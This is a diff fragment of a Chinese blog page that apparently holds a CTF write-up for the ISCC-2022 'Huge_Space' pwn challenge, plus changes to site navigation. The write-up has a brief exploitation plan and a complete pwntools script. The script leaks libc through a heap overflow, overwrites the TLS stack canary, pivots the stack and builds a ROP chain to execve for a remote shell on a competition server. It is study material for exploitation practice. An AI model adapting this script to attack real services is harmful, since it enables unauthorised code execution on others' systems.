</span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+<h2 id="Huge-Space"><a href="#Huge-Space" class="headerlink" title="Huge_Space"></a><font color="DarkTurquoise">Huge_Space</font></h2><p><img src="https://cdn.jsdelivr.net/gh/Lsec-cyber/images@main/img/p8-1.png"></p>
+<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析:"></a>分析:</h3><ul>
+<li>溢出栈，布置栈迁移 rop</li>
+<li>堆溢出覆盖 topchunk，free 到 unsortedbin，申请出来泄露 libc</li>
+<li>申请大内存，溢出覆盖 tls 结构的 canary</li>
+<li>输入 cmd，在 cmd 后面构造调用 execve 的 rop </li>
+<li>exit 返回到 main 函数，绕过 canary，栈迁移到 bss，调用 ececv</li>
+</ul>
+<h3 id="exp如下-6"><a href="#exp如下-6" class="headerlink" title="exp如下:"></a>exp如下:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"># -*- coding: UTF-8 -*- 
+from pwn import *  
+context.log_level = 'debug' 
+context.terminal = ["/bin/tmux","sp","-h"] 
+io = remote('123.57.69.203',5330 ) # libc = ELF('.bc-2.31.so') 
+# io = process('./Huge_Space') 
+#libc = ELF('.bc.so.6') 
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6') 
+elf = ELF('./33') 
+l64 = lambda :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00")) 
+l32 = lambda :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00")) 
+rl = lambda a=False : io.recvline(a) 
+ru = lambda a,b=True : io.recvuntil(a,b) 
+rn = lambda x : io.recvn(x) 
+sn = lambda x : io.send(x) 
+sl = lambda x : io.sendline(x) 
+sa = lambda a,b : io.sendafter(a,b) 
+sla = lambda a,b : io.sendlineafter(a,b) 
+irt = lambda : io.interactive() 
+dbg = lambda text=None : gdb.attach(io, text) 
+lg = lambda s : log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s))) 
+uu32 = lambda data : u32(data.ljust(4, '\x00')) 
+uu64 = lambda data : u64(data.ljust(8, '\x00')) 
+ur64 = lambda data : u64(data.rjust(8, '\x00')) 
+def add(idx,size,content): 
+	sl('+++') 
+	sla('Index:',str(idx)) 
+	sla('Size: ',str(size)) 
+	sla('Data: ',content) 
+def show(idx,size): 
+	sl('print') 
+	sla('Index:',str(idx)) 
+	sla('Size: ',str(size)) 
+pop_rdi = 0x0000000000400be3 
+pop_rsi_r15 = 0x0000000000400be1 
+pop_rdx = 0x0000000000001b96 
+pop_rbp = 0x0000000000400860 
+leaveret = 0x40090F 
+sh = 0x400909 
+writee = 0x400B19 
+# dbg() 
+sl('\x00'*(8*9)+p64(pop_rbp)+p64(0x6010c0+0x10)+p64(leaveret)) 
+add(0,0x10,'A'*0x10+p64(0)+p64(0xd81))#0 
+add(1,0x1000,'B')#1 
+add(1,0xd50,'')#1 
+# add(2,0x1fa0,'')#2 
+show(1,0x20) 
+# show(2,0x20) 
+# irt() 
+libcbase = l64() - 0x3ebc00 
+lg('libcbase') 
+execve = libcbase + libc.symbols['execve'] 
+lg('execve') 
+sl('666') 
+# dbg() 
+add(3,0x22000,'\x00'*(0x24518+16*8)+'\x00'*8)#3 local 0x24828 8273 
+sl('exit\x00\x00\x00\x00/bin\x00'+p64(pop_rdi)*2+p64(0x6010c0+8)+ p64(pop_rsi_r15)+p64(0)*2+p64(pop_rdx+libcbase)+p64(0)+p64(execve)) 
+irt()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
                 
             </div>
             <hr/>
@@ -957,67 +1654,9 @@ new Valine({
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
-            <div class="card">
-                <a href="/2022/05/21/pwn/">
-                    <div class="card-image">
-                        
-                        <img src="/medias/featureimages/Pwn.jpg" class="responsive-img" alt="Pwn">
-                        
-                        <span class="card-title">Pwn</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-21
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/ISCC-2022/" class="post-category">
-                                    ISCC-2022
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                    <a href="/tags/ISCC-2022/">
-                        <span class="chip bg-color">ISCC-2022</span>
-                    </a>
-                    
-                    <a href="/tags/Pwn/">
-                        <span class="chip bg-color">Pwn</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
                 <a href="/2022/05/21/mobile/">
                     <div class="card-image">
@@ -1034,9 +1673,9 @@ new Valine({
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-21
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-21
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1062,6 +1701,62 @@ new Valine({
                     
                     <a href="/tags/Mobile/">
                         <span class="chip bg-color">Mobile</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/05/21/misc/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/Misc.jpg" class="responsive-img" alt="Misc">
+                        
+                        <span class="card-title">Misc</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ISCC-2022/" class="post-category">
+                                    ISCC-2022
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/Misc/">
+                        <span class="chip bg-color">Misc</span>
+                    </a>
+                    
+                    <a href="/tags/ISCC-2022/">
+                        <span class="chip bg-color">ISCC-2022</span>
                     </a>
                     
                 </div>
@@ -1300,7 +1995,7 @@ new Valine({
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">529</span>&nbsp;字
+                class="white-color">13.8k</span>&nbsp;字
             
             
             
